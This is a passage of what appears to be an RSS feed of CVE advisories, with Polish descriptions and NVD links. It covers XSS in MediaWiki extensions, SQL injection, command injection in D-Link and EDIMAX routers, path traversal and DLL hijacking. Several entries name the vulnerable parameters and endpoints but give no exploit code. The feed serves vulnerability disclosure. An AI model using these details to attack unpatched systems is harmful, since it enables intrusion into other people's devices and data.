+CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2026-22710</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22710</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - rozszerzenie Wikibase umożliwia obsługę skryptów krzyżowych (XSS). Ten problem dotyczy Mediawiki - rozszerzenie Wikibase: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22712</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22712</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Niewłaściwe kodowanie lub ucieczka danych wyjściowych z powodu zamiany magicznych słów w luce ParserAfterTidy w Wikimedia Foundation Mediawiki - rozszerzenie ApprovedRevs umożliwia manipulację danymi wejściowymi. Ten problem dotyczy rozszerzenia Mediawiki - ApprovedRevs: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22713</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22713</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w rozszerzeniu Wikimedia Foundation Mediawiki - GrowthExperiments umożliwia obsługę skryptów Cross-Site Scripting (XSS). Ten problem dotyczy rozszerzenia Mediawiki - GrowthExperiments: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2025-67282</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67282</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z obejściem autoryzacji, które umożliwiają użytkownikowi o niskich uprawnieniach pobieranie skrótów haseł innego użytkownika, uzyskiwanie dostępu do elementów roboczych innego użytkownika, modyfikowanie ograniczonej zawartości w przepływach pracy, modyfikowanie logo aplikacji i manipulowanie profilem innego użytkownika.</description></item><item><title>CVE-2025-67281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67281</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach polegających na wstrzykiwaniu kodu SQL, które umożliwiają użytkownikowi o niskich uprawnieniach i uprawnieniach administratora dostęp do bazy danych i jej zawartości.</description></item><item><title>CVE-2025-67280</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67280</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z wstrzykiwaniem języka Hibernate Query Language, które umożliwiają użytkownikowi o niskim poziomie uprawnień wyodrębnianie haseł innych użytkowników i uzyskiwanie dostępu do wrażliwych danych innego użytkownika.</description></item><item><title>CVE-2025-67279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67279</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pośrednictwem aplikacji przechowującej skróty haseł w formacie MD5</description></item><item><title>CVE-2025-67278</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67278</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pomocą spreparowanego żądania HTTP</description></item><item><title>CVE-2025-67004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67004</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach CouchCMS 2.4 umożliwiająca ujawnienie informacji umożliwia administratorowi odczytywanie dowolnych plików poprzez przechodzenie po katalogach.Może ujawnić kod źródłowy lub inne poufne informacje, jeśli zostanie odpowiednio uzbrojony.</description></item><item><title>CVE-2025-70161</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-70161</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>EDIMAX BR-6208AC V2_1.02 jest podatny na wstrzykiwanie poleceń.Dzieje się tak, ponieważ pole pppUserName jest bezpośrednio przekazywane do polecenia powłoki za pośrednictwem funkcji system() bez odpowiedniego oczyszczenia.Osoba atakująca może to wykorzystać, wprowadzając złośliwe polecenia do pola pppUserName, umożliwiając wykonanie dowolnego kodu.</description></item><item><title>CVE-2025-69542</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69542</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W usłudze demona DHCP D-Link DIR895LA1 v102b07 wykryto lukę w zabezpieczeniach związaną z wstrzykiwaniem poleceń.Luka występuje w logice przetwarzania odnowienia dzierżawy, w której parametr nazwy hosta DHCP jest bezpośrednio łączony z poleceniem systemowym bez odpowiedniego oczyszczenia.Gdy klient DHCP odnawia istniejącą dzierżawę przy użyciu złośliwej nazwy hosta, dowolne polecenia mogą być wykonywane z uprawnieniami roota.</description></item><item><title>CVE-2025-67133</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67133</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Błąd w Hero Motocorp Vida V1 Pro 2.0.7 umożliwia lokalnemu atakującemu spowodowanie odmowy usługi za pośrednictwem komponentu BLE</description></item><item><title>CVE-2025-66744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66744</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Yonyou YonBIP v3 i wcześniejszych interfejs LoginWithV8 w systemie obsługi aplikacji danych szeregowych jest podatny na przemierzanie ścieżek, umożliwiając nieautoryzowany dostęp do wrażliwych informacji w systemie</description></item><item><title>CVE-2025-66715</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66715</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach Axtion ODISSAAS ODIS v1.8.4 umożliwiająca przejęcie biblioteki DLL umożliwia atakującym wykonanie dowolnego kodu za pośrednictwem spreparowanego pliku DLL.</description></item><item><title>CVE-2025-67810</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67810</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Area9 Rhapsode 1.47.3 uwierzytelniony atakujący może wykorzystać parametry operacji, adresu URL i nazwy pliku za pośrednictwem żądania POST w celu odczytania dowolnych plików z systemu plików serwera.Naprawiono w wersji 1.47.4 (#7254) i kolejnych wersjach.</description></item><item><title>CVE-2025-67811</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67811</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Area9 Rhapsode 1.47.3 umożliwia wstrzykiwanie SQL za pośrednictwem wielu punktów końcowych API dostępnych dla uwierzytelnionych użytkowników.Niewystarczająca weryfikacja danych wejściowych umożliwia zdalnym atakującym wprowadzenie dowolnych poleceń SQL, co skutkuje nieautoryzowanym dostępem do bazy danych i potencjalnym naruszeniem poufnych danych.Naprawiono w wersji 1.47.4 i nowszych.</description></item><item><title>CVE-2025-60538</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-60538</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Brak ograniczenia szybkości na stronie logowania shiori w wersji 1.7.4 i niższych pozwala atakującym ominąć uwierzytelnianie za pomocą ataku brute-force.</description></item><item><title>CVE-2025-51626</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-51626</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach polegająca na wstrzykiwaniu SQL w pss.sale.com 1.0 poprzez parametr id do punktu końcowego userfiles/php/cancel_order.php.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Thu, 08 Jan 2026 23:56:07 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-0733</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0733</link><pubDate>Thu, 08 Jan 2026 23:32:13 +0000</pubDate><description>W systemie rejestracji kursów online PHPGurukul do wersji 3.1 została stwierdzona luka.Ma to wpływ na nieznaną funkcję pliku /onlinecourse/admin/manage-students.php.Ta manipulacja argumentem cid powoduje wstrzyknięcie sql.Istnieje możliwość zdalnego zainicjowania ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.
 
 CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2026-0732</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0732</link><pubDate>Thu, 08 Jan 2026 23:32:08 +0000</pubDate><description>W D-Link DI-8200G 17.12.20A1 została odkryta podatność.Wpływa to na nieznaną funkcję pliku /upgrade_filter.asp.Manipulacja ścieżką argumentów powoduje wstrzyknięcie polecenia.Atak może zostać przeprowadzony zdalnie.Exploit został upubliczniony i może zostać wykorzystany.
 
